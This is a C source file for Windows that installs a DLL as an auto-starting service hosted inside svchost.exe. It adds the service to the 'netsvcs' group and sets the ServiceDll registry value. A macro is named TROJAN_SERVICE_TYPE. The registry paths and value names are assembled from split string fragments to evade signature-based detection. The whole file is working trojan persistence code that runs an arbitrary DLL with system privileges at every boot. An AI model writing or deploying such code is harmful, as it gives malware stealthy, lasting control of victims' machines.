#include <Windows.h>
#include <tchar.h>

#pragma comment(linker,"/ENTRY:NewMain")

#define TROJAN_SERVICE_TYPE							SERVICE_WIN32_OWN_PROCESS

BOOL AddSvchostService(const TCHAR *filename, const TCHAR *modulename,
	const TCHAR *servicename, const TCHAR *displayname, const TCHAR *description)
{
	HKEY hkey, hsubkey;
	const TCHAR *lpvaluename = _T("netsvcs");
	//const TCHAR *lpvaluename=_T("FindBug");
	TCHAR keyname[256];
	TCHAR valuename[256];
	DWORD type;
	TCHAR lpdata[1024];
	DWORD size = sizeof(lpdata);
	DWORD servicetype = SERVICE_WIN32_OWN_PROCESS;
	SC_HANDLE hmanager;
	SC_HANDLE hservice = NULL;
	TCHAR *commandline;
	TCHAR *lpservicename;
	UINT k, k0, k1;
	UINT h;
	BOOL result = FALSE;

	hmanager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hmanager != NULL)
	{
		_tcscpy(keyname, _T("SOFTW"));
		k = _tcslen(keyname);
		_tcscpy(keyname + k, _T("ARE\\Micros"));
		k += _tcslen(keyname + k);
		_tcscpy(keyname + k, _T("oft\\Wi"));
		k += _tcslen(keyname + k);
		_tcscpy(keyname + k, _T("ndows N"));
		k += _tcslen(keyname + k);
		_tcscpy(keyname + k, _T("T\\Curr"));
		k += _tcslen(keyname + k);
		_tcscpy(keyname + k, _T("entVersi"));
		k += _tcslen(keyname + k);
		_tcscpy(keyname + k, _T("on\\Svc"));
		k += _tcslen(keyname + k);
		_tcscpy(keyname + k, _T("host"));
		k += _tcslen(keyname + k);
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyname, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
		{
			lpservicename = (TCHAR *)lpdata;
			k1 = 0;
			if (RegQueryValueEx(hkey, lpvaluename, 0, &type, (BYTE *)lpdata, &size) == ERROR_SUCCESS)
			{
				while ((k0 = _tcslen(lpservicename))>0)
				{
					//if(k1==0 && lstrcmpi(lpservicename,servicename)==0)
					if (lstrcmpi(lpservicename, servicename) == 0)
					{
						k1 = k0;

						break;
					}

					lpservicename += k0 + 1;
				}
			}
			else
			{
				size = sizeof(TCHAR);
				type = REG_MULTI_SZ;
			}

			if (k1 == 0)
			{
				_tcscpy(lpservicename, servicename);
				k1 = _tcslen(lpservicename);
				lpservicename += k1 + 1;
				lpservicename[0] = _T('\0');

				RegSetValueEx(hkey, lpvaluename, 0, type, (CONST BYTE *)lpdata, size + (k1 + 1) * sizeof(TCHAR));
			}

			RegCloseKey(hkey);

			commandline = (TCHAR *)lpdata;
			wsprintf(commandline, _T("%s -k %s"), filename, lpvaluename);

			hservice = OpenService(hmanager, servicename, SERVICE_ALL_ACCESS);
			if (hservice != NULL)
			{
				/*
				QueryServiceStatus(hservice,&ss);
				if(ss.dwCurrentState==SERVICE_RUNNING)
				{
				result=ControlService(hservice,SERVICE_CONTROL_STOP,&ss);
				}
				while(QueryServiceStatus(hservice,&ss))
				{
				if(ss.dwCurrentState==SERVICE_STOP)
				{
				break;
				}
				}
				*/

				result = TRUE;

				CloseServiceHandle(hservice);
			}
			else
			{
				hservice = CreateService(
					hmanager,													// SCManager database
					servicename,												// name of service
					displayname,												// service name to display
					SERVICE_ALL_ACCESS,										// desired access
																			//TROJAN_SERVICE_TYPE | SERVICE_INTERACTIVE_PROCESS,
					TROJAN_SERVICE_TYPE,
					SERVICE_AUTO_START,										// start type
					SERVICE_ERROR_NORMAL,										// error control type
					commandline,												// service's binary
					NULL,														// no load ordering group
					NULL,														// no tag identifier
					NULL,														// no dependencies
					NULL,														// LocalSystem account
					NULL														// no password
				);
				if (hservice != NULL)
				{
					_tcscpy(keyname, _T("SYSTE"));
					k = _tcslen(keyname);
					_tcscpy(keyname + k, _T("M\\Curr"));
					k += _tcslen(keyname + k);
					_tcscpy(keyname + k, _T("entCont"));
					k += _tcslen(keyname + k);
					_tcscpy(keyname + k, _T("rolSet\\"));
					k += _tcslen(keyname + k);
					_tcscpy(keyname + k, _T("Servi"));
					k += _tcslen(keyname + k);
					_tcscpy(keyname + k, _T("ces\\"));
					k += _tcslen(keyname + k);

					_tcscpy(keyname + k, servicename);

					if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyname, 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
					{
						_tcscpy(valuename, _T("Ty"));
						h = _tcslen(valuename);
						_tcscpy(valuename + h, _T("pe"));
						//h+=_tcslen(valuename+h);
						RegSetValueEx(hkey, valuename, 0, REG_DWORD, (CONST BYTE *)&servicetype, sizeof(DWORD));


						_tcscpy(valuename, _T("Desc"));
						h = _tcslen(valuename);
						_tcscpy(valuename + h, _T("rip"));
						h += _tcslen(valuename + h);
						_tcscpy(valuename + h, _T("tion"));
						//h+=_tcslen(valuename+h);
						RegSetValueEx(hkey, valuename, 0, REG_SZ, (CONST BYTE *)description, (_tcslen(description) + 1) * sizeof(TCHAR));

						_tcscpy(keyname + k + k1, _T("\\Par"));
						h = _tcslen(keyname + k + k1);
						_tcscpy(keyname + k + k1 + h, _T("amet"));
						h += _tcslen(keyname + k + k1 + h);
						_tcscpy(keyname + k + k1 + h, _T("ers"));
						//h+=_tcslen(keyname+k+k1+h);

						if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, keyname, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hsubkey, NULL) == ERROR_SUCCESS)
						{
							_tcscpy(valuename, _T("Servi"));
							h = _tcslen(valuename);
							_tcscpy(valuename + h, _T("ceDll"));
							//h+=_tcslen(valuename+h);
							RegSetValueEx(hsubkey, valuename, 0, REG_EXPAND_SZ, (CONST BYTE *)modulename, (_tcslen(modulename) + 1) * sizeof(TCHAR));

							RegCloseKey(hsubkey);

							result = TRUE;
						}

						RegCloseKey(hkey);
					}

					CloseServiceHandle(hservice);
				}
			}
		}

		CloseServiceHandle(hmanager);
	}

	return(result);
}

int wmain(int argc, WCHAR *argv[])
{
	AddSvchostService(L"C:\\Windows\\System32\\svchost.exe", L"C:\\Tools\\test.dll",
		L"test1", L"test1", L"test1");

	return(0);
}
VOID WINAPI NewMain(VOID)
{
	AddSvchostService(L"C:\\Windows\\System32\\svchost.exe", L"C:\\Tools\\test.dll",
		L"test1", L"test1", L"test1");

	ExitProcess(0);
}